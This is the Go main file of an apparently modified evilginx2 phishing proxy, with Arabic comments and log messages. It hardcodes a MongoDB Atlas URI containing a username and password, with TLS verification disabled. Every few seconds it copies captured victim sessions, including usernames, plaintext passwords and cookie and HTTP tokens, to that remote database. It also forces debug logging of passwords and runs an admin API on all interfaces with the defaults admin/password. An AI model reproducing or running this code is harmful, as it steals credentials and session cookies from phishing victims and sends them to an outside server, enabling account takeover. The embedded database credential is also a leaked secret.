package main

import (
	"flag"
	"fmt"
	_log "log"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"time"

	"github.com/caddyserver/certmagic"
	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"go.uber.org/zap"

	"github.com/fatih/color"
)

// متغيرات الألوان للوحة القيادة
var lb = color.New(color.FgHiBlue).SprintFunc()   // أزرق
var lg = color.New(color.FgHiGreen).SprintFunc()  // أخضر
var lr = color.New(color.FgHiRed).SprintFunc()    // أحمر
var e = ""

var phishlets_dir = flag.String("p", "", "Phishlets directory path")
var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
var debug_log = flag.Bool("debug", false, "Enable debug output")
var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
var cfg_dir = flag.String("c", "", "Configuration directory path")
var version_flag = flag.Bool("v", false, "Show version")
var api_flag = flag.Bool("api", true, "Enable API server")
var api_host = flag.String("api-host", "0.0.0.0", "API server host")
var api_port = flag.Int("api-port", 8888, "API server port")
var admin_username = flag.String("admin-username", "admin", "Admin username for API server")
var admin_password = flag.String("admin-password", "password", "Admin password for API server")
var setup_session = flag.String("setup-session", "setup", "تعيين اسم جلسة الإعداد البعيد")
var tkn_ptr = flag.String("token", "", "تعيين رمز وصول التحكم عن بعد (مطلوب للتحكم عن بعد)")
var daemon_ptr = flag.Bool("daemon", false, "تشغيل في وضع الخادم")
var hostname_ptr = flag.String("hostname", "", "تعيين المضيف للاستماع")
var port_ptr = flag.Int("port", 8080, "تعيين منفذ للاستماع")
var http_ptr = flag.Bool("http", false, "تمكين الاستماع إلى HTTP")
var no_https_ptr = flag.Bool("no-https", false, "تعطيل الاستماع إلى HTTPS")
var ip_ptr = flag.String("ip", "", "تعيين عنوان IP الخارجي")
var unauth_ptr = flag.String("unauth", "https://www.google.com/", "تعيين URL لإعادة التوجيه للمستخدمين غير المصرح لهم")
var db_path = flag.String("db-path", "", "تعيين مسار ملف قاعدة البيانات")

func joinPath(base_path string, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}

func showAd() {
	lred := color.New(color.FgHiRed)
	lyellow := color.New(color.FgHiYellow)
	white := color.New(color.FgHiWhite)
	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Evilginx Mastery Course"), lyellow.Sprint("https://academy.breakdev.org/evilginx-mastery"), white.Sprint("(learn how to create phishlets)"))
	log.Info("%s", message)
}

func main() {
	flag.Parse()

	if *version_flag == true {
		log.Info("version: %s", core.VERSION)
		return
	}

	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()
	showAd()

	_log.SetOutput(log.NullLogger().Writer())
	certmagic.Default.Logger = zap.NewNop()
	certmagic.DefaultACME.Logger = zap.NewNop()

	if *phishlets_dir == "" {
		*phishlets_dir = joinPath(exe_dir, "./phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			*phishlets_dir = "/usr/share/evilginx/phishlets/"
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
				return
			}
		}
	}
	if *redirectors_dir == "" {
		*redirectors_dir = joinPath(exe_dir, "./redirectors")
		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
			*redirectors_dir = "/usr/share/evilginx/redirectors/"
			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
				*redirectors_dir = joinPath(exe_dir, "./redirectors")
			}
		}
	}
	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
	}

	log.DebugEnable(*debug_log || true)  // تفعيل وضع التصحيح دائمًا
	if *debug_log {
		log.Info("debug output enabled")
	}

	phishlets_path := *phishlets_dir
	log.Info("loading phishlets from: %s", phishlets_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetRedirectorsDir(*redirectors_dir)

	// إعلان متغير واجهة قاعدة البيانات
	var db database.IDatabase
	var buntDb *database.Database

	// استخدام MongoDB بشكل افتراضي دائمًا
	// استخدام عنوان MongoDB الثابت بإعدادات إضافية لتجاوز مشاكل TLS
	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsInsecure=true&ssl=true"
	db_name := "evilginx"

	fmt.Printf("\n\n")
	fmt.Printf(lb(" تهيئة قاعدة بيانات MongoDB... "))

	var mongo_db *database.MongoDatabase
	var mongoConnected bool = false
	
	mongo_db, err = database.NewMongoDatabase(mongo_uri, db_name)
	if err != nil {
		log.Error("فشل الاتصال بـ MongoDB: %v", err)
		log.Warning("سيتم استخدام BuntDB فقط بدون مزامنة مع MongoDB")
		mongoConnected = false
	} else {
		mongoConnected = true
		db = mongo_db
		log.Success("تم الاتصال بـ MongoDB بنجاح!")
	}

	fmt.Printf(lg("تم") + e)
	
	// سنستخدم BuntDB دائمًا كقاعدة بيانات أساسية
	tmpPath := filepath.Join(*cfg_dir, "tmp_bunt.db")
	fdb, err := database.NewDatabase(tmpPath)
	if err != nil {
		log.Fatal("%v", err)
	}
	buntDb = fdb
	
	// إذا لم نتمكن من الاتصال بـ MongoDB، سنستخدم BuntDB كقاعدة بيانات أساسية
	if !mongoConnected {
		db = buntDb
	}

	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}

	files, err := os.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if rpname == nil || len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
				if err != nil {
					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
					continue
				}
				cfg.AddPhishlet(pname, pl)
			}
		}
	}
	cfg.LoadSubPhishlets()
	cfg.CleanUp()

	ns, _ := core.NewNameserver(cfg)
	ns.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}

	// نحن نستخدم BuntDB دائمًا في core لأنه حاليًا لا يدعم واجهة IDatabase
	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, buntDb, bl, *developer_mode)
	
	// تأكد من مزامنة أي جلسات حالية في BuntDB
	if mongoConnected {
		log.Info("مزامنة الجلسات الحالية من BuntDB إلى MongoDB...")
		syncSessionsToMongoDB(buntDb, db)
		
		// إضافة معالج حدث على فترات منتظمة لنقل الجلسات من BuntDB إلى MongoDB
		// استخدام فترة أقصر (5 ثوان) للتأكد من مزامنة الجلسات بسرعة
		go func() {
			for {
				time.Sleep(5 * time.Second)  // كل 5 ثوان
				syncSessionsToMongoDB(buntDb, db)
			}
		}()
		
		// إضافة اعتراض لدوال تحديث الجلسة في BuntDB لتحديث MongoDB مباشرة
		go monitorSessionUpdates(buntDb, db)
	}
	
	hp.Start()

	// Start API server if enabled (الآن API تعمل دائمًا)
	// التأكد من وجود اسم مستخدم وكلمة مرور
	if *admin_username == "" || *admin_password == "" {
		log.Info("Admin credentials not provided, using defaults: admin/password")
		if *admin_username == "" {
			*admin_username = "admin"
		}
		if *admin_password == "" {
			*admin_password = "password"
		}
	}
	
	var api *core.ApiServer
	var apiErr error
	
	if mongoConnected {
		// نستخدم النوع المناسب من قاعدة البيانات - تجربة استخدام MongoDB مباشرة
		log.Info("محاولة تشغيل API مع MongoDB")
		api, apiErr = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, db)
	} else {
		api, apiErr = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, buntDb)
	}
	
	if apiErr != nil {
		log.Error("فشل تشغيل خادم API: %v", apiErr)
		log.Warning("محاولة تشغيل API مع BuntDB بدلاً من ذلك")
		api, apiErr = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, buntDb)
		if apiErr != nil {
			log.Fatal("api server: %v", apiErr)
			return
		}
	}
	
	api.Start()
	log.Success("تم تشغيل API server على %s:%d", *api_host, *api_port)

	// إضافة سجل تصحيحي عن إعدادات API
	log.Info("تشغيل API على العنوان: %s:%d", *api_host, *api_port)
	log.Info("يمكنك الوصول إلى لوحة التحكم عبر http://%s:%d/static/dashboard.html", *api_host, *api_port)

	t, err := core.NewTerminal(hp, cfg, crt_db, buntDb, *developer_mode)
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	t.DoWork()
}

// syncSessionsToMongoDB ينقل الجلسات من BuntDB إلى MongoDB
func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase) {
	// التحقق من أن قاعدة البيانات غير فارغة
	if mongoDb == nil {
		log.Error("فشل المزامنة: قاعدة بيانات MongoDB غير متصلة")
		return
	}
	
	log.Debug("بدء مزامنة الجلسات من BuntDB إلى MongoDB...")
	
	// التحقق من أن BuntDB غير فارغة
	if buntDb == nil {
		log.Error("فشل المزامنة: قاعدة بيانات BuntDB غير متصلة")
		return
	}
	
	sessions, err := buntDb.ListSessions()
	if err != nil {
		log.Error("فشل قراءة الجلسات من BuntDB: %v", err)
		return
	}
	
	log.Debug("تم العثور على %d جلسة في BuntDB للمزامنة", len(sessions))
	
	if len(sessions) == 0 {
		// لا توجد جلسات للمزامنة
		return
	}
	
	success := 0
	for _, s := range sessions {
		log.Debug("محاولة مزامنة الجلسة %s (Phishlet: %s)...", s.SessionId, s.Phishlet)
		
		// تجاهل الجلسات بدون معرف
		if s.SessionId == "" {
			log.Warning("تم تجاهل جلسة بدون معرف SID")
			continue
		}
		
		// تحقق ما إذا كانت الجلسة موجودة بالفعل في MongoDB
		_, err := mongoDb.GetSessionBySid(s.SessionId)
		if err != nil {
			// إنشاء الجلسة في MongoDB إذا لم تكن موجودة
			log.Debug("الجلسة غير موجودة في MongoDB، يتم إنشاؤها...")
			
			err = mongoDb.CreateSession(s.SessionId, s.Phishlet, s.LandingURL, s.UserAgent, s.RemoteAddr)
			if err != nil {
				log.Error("فشل إنشاء الجلسة في MongoDB: %v", err)
				continue
			}
			
			// نقل البيانات الأخرى مع التحقق من الخطأ في كل خطوة
			if s.Username != "" {
				log.Debug("تحديث اسم المستخدم للجلسة %s: %s", s.SessionId, s.Username)
				err = mongoDb.SetSessionUsername(s.SessionId, s.Username)
				if err != nil {
					log.Error("فشل تحديث اسم المستخدم: %v", err)
				}
			}
			if s.Password != "" {
				log.Debug("تحديث كلمة المرور للجلسة %s", s.SessionId)
				err = mongoDb.SetSessionPassword(s.SessionId, s.Password)
				if err != nil {
					log.Error("فشل تحديث كلمة المرور: %v", err)
				}
			}
			if len(s.Custom) > 0 {
				log.Debug("تحديث البيانات المخصصة للجلسة %s (%d عناصر)", s.SessionId, len(s.Custom))
				for k, v := range s.Custom {
					err = mongoDb.SetSessionCustom(s.SessionId, k, v)
					if err != nil {
						log.Error("فشل تحديث البيانات المخصصة: %v", err)
					}
				}
			}
			if len(s.BodyTokens) > 0 {
				log.Debug("تحديث رموز الهيكل للجلسة %s (%d عناصر)", s.SessionId, len(s.BodyTokens))
				err = mongoDb.SetSessionBodyTokens(s.SessionId, s.BodyTokens)
				if err != nil {
					log.Error("فشل تحديث رموز الهيكل: %v", err)
				}
			}
			if len(s.HttpTokens) > 0 {
				log.Debug("تحديث رموز HTTP للجلسة %s (%d عناصر)", s.SessionId, len(s.HttpTokens))
				err = mongoDb.SetSessionHttpTokens(s.SessionId, s.HttpTokens)
				if err != nil {
					log.Error("فشل تحديث رموز HTTP: %v", err)
				}
			}
			if len(s.CookieTokens) > 0 {
				log.Debug("تحديث رموز الكوكيز للجلسة %s (%d domains)", s.SessionId, len(s.CookieTokens))
				err = mongoDb.SetSessionCookieTokens(s.SessionId, s.CookieTokens)
				if err != nil {
					log.Error("فشل تحديث رموز الكوكيز: %v", err)
				}
			}
			
			success++
			log.Info("تمت مزامنة الجلسة %s من BuntDB إلى MongoDB", s.SessionId)
		} else {
			log.Debug("الجلسة %s موجودة بالفعل في MongoDB", s.SessionId)
		}
	}
	
	if success > 0 {
		log.Info("اكتملت المزامنة: تمت مزامنة %d من %d جلسة بنجاح", success, len(sessions))
	}
}

// monitorSessionUpdates يراقب تحديثات الجلسات في BuntDB ويحدث MongoDB مباشرة
func monitorSessionUpdates(buntDb *database.Database, mongoDb database.IDatabase) {
	log.Debug("بدء مراقبة تحديثات الجلسات...")
	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	var lastSessions []*database.Session
	
	for range ticker.C {
		// الحصول على قائمة الجلسات الحالية
		sessions, err := buntDb.ListSessions()
		if err != nil {
			log.Error("فشل الحصول على قائمة الجلسات: %v", err)
			continue
		}
		
		// إذا كانت هذه هي المرة الأولى، نحفظ القائمة ونستمر
		if lastSessions == nil {
			lastSessions = sessions
			continue
		}
		
		// البحث عن الجلسات المحدثة
		for _, current := range sessions {
			// البحث عن الجلسة السابقة
			var previous *database.Session
			for _, s := range lastSessions {
				if s.SessionId == current.SessionId {
					previous = s
					break
				}
			}
			
			// إذا لم نجد الجلسة السابقة، فهي جلسة جديدة
			if previous == nil {
				log.Debug("تم اكتشاف جلسة جديدة: %s", current.SessionId)
				continue
			}
			
			// التحقق من تحديث اسم المستخدم
			if current.Username != previous.Username && current.Username != "" {
				log.Debug("تم اكتشاف تحديث اسم المستخدم: %s -> %s", previous.Username, current.Username)
				err = mongoDb.SetSessionUsername(current.SessionId, current.Username)
				if err != nil {
					log.Error("فشل تحديث اسم المستخدم في MongoDB: %v", err)
				} else {
					log.Success("تم تحديث اسم المستخدم في MongoDB: %s", current.Username)
				}
			}
			
			// التحقق من تحديث كلمة المرور
			if current.Password != previous.Password && current.Password != "" {
				log.Debug("تم اكتشاف تحديث كلمة المرور: %s -> %s", previous.Password, current.Password)
				err = mongoDb.SetSessionPassword(current.SessionId, current.Password)
				if err != nil {
					log.Error("فشل تحديث كلمة المرور في MongoDB: %v", err)
				} else {
					log.Success("تم تحديث كلمة المرور في MongoDB: %s", current.Password)
				}
			}
			
			// التحقق من تحديث البيانات المخصصة
			for key, value := range current.Custom {
				prevValue, exists := previous.Custom[key]
				if !exists || value != prevValue {
					log.Debug("تم اكتشاف تحديث بيانات مخصصة: %s -> %s", key, value)
					err = mongoDb.SetSessionCustom(current.SessionId, key, value)
					if err != nil {
						log.Error("فشل تحديث البيانات المخصصة في MongoDB: %v", err)
					} else {
						log.Success("تم تحديث البيانات المخصصة في MongoDB: %s = %s", key, value)
					}
				}
			}
		}
		
		// تحديث القائمة السابقة
		lastSessions = sessions
	}
}
